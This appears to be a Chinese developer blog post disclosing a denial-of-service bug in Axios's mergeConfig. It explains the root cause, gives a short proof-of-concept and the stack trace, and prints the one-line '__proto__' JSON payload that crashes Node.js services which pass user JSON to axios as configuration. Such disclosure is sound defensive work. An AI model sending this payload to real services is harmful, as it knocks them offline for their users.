---
title: "炸了！Axios 出现重大漏洞！会导致 Nodejs 崩掉！"
link: "http://mp.weixin.qq.com/s?__biz=Mzg2NjY2NTcyNg==&mid=2247508819&idx=1&sn=94df02860992f8dd3f3e29fe2b23aed3&chksm=ce45b6c2f9323fd42c46ae9d2b26a6f3f493a3e233b6e4ff67906e668bbf952b0d2c697640d5#rd"
date: 2026-02-13
md5: c2fbc8cc080626e08be6a1f30670832f
---

# 炸了！Axios 出现重大漏洞！会导致 Nodejs 崩掉！

Axios 里的 `mergeConfig` 函数，在处理配置对象时，如果对象里**自带 `__proto__` 这个属性**，会直接抛出 `TypeError` 导致程序崩溃。 攻击者只要构造一个恶意配置对象（用 `JSON.parse()` 生成），就能让**服务直接挂掉**。

![图片](./images/c7984f97dae678e82d1beacf848914c9.png)

---

## 漏洞原理

漏洞出在文件： `lib/core/mergeConfig.js` 第 98–101 行

```
utils.forEach(Object.keys({ ...config1, ...config2 }), function computeConfigValue(prop) {
  const merge = mergeMap[prop] || mergeDeepProperties;
  const configValue = merge(config1[prop], config2[prop], prop);
  (utils.isUndefined(configValue) && merge !== mergeDirectKeys) || (config[prop] = configValue);
});
```
崩溃过程很简单：

1. 用 `JSON.parse('{"__proto__": {...}}')` 生成的对象，\*\*`__proto__` 会变成一个普通、可遍历的属性\*\*
2. `Object.keys()` 会把 `__proto__` 遍历出来
3. 代码执行 `mergeMap['__proto__']`，会顺着原型链查到 `Object.prototype` 并返回
4. 于是 `merge` 变量拿到的不是函数，而是 `Object.prototype`
5. 后面调用 `merge(...)` 就会报错： `TypeError: merge is not a function`

`mergeConfig` 会被这些核心函数调用：

- `Axios._request()`
- `Axios.getUri()`
- 所有快捷方法：`get`、`post` 等

也就是说：**只要发请求，就可能触发**。

---

## 漏洞复现（PoC）

```
import axios from "axios";

const maliciousConfig = JSON.parse('{"__proto__": {"x": 1}}');
await axios.get("https://httpbin.org/get", maliciousConfig);
```
### 复现步骤

1. 安装或引入 axios
2. 运行上面这段代码
3. 程序直接崩溃

### 报错信息（axios 1.13.4）

```
TypeError: merge is not a function
    at computeConfigValue (lib/core/mergeConfig.js:100:25)
    at Object.forEach (lib/utils.js:280:10)
    at mergeConfig (lib/core/mergeConfig.js:98:9)
```
---

## 测试对比



| 测试场景 | 配置 | 结果 |
| --- | --- | --- |
| 正常配置 | {"timeout": 5000} | 正常运行 |
| 恶意配置 | JSON.parse('{"__proto__": {"x": 1}}') | 直接崩溃 |
| 普通嵌套对象 | {"headers": {"X-Test": "value"}} | 正常运行 |


---

## 攻击场景

只要你的服务满足这两点，就**百分百可被打挂**：

1. 接收前端/用户传过来的 JSON
2. 把解析后的对象**直接传给 axios 当配置**

攻击者只需要传：

```
{"__proto__": {"x": 1}}
```
服务一处理就崩。

---

## 漏洞影响

- 类型：**拒绝服务（DoS）**
- 后果：服务直接崩溃，无法正常提供功能
- 影响范围：
- 所有用 axios 的 Node.js 服务
- 所有把用户 JSON 传给 axios 配置的后端

> 特别说明： **这不是原型污染** 程序在执行任何赋值操作之前，就已经先崩溃了。

## 结语

我是林三心，一个待过**小型toG型外包公司、大型外包公司、小公司、潜力型创业公司、大公司**的作死型前端选手

我建了一些**前端学习群**，如果大家想进群交流前端知识，可以关注我，回复**加群**

![图片](./images/e91fb1f23e19c80e44012a0dbb56108a.webp)
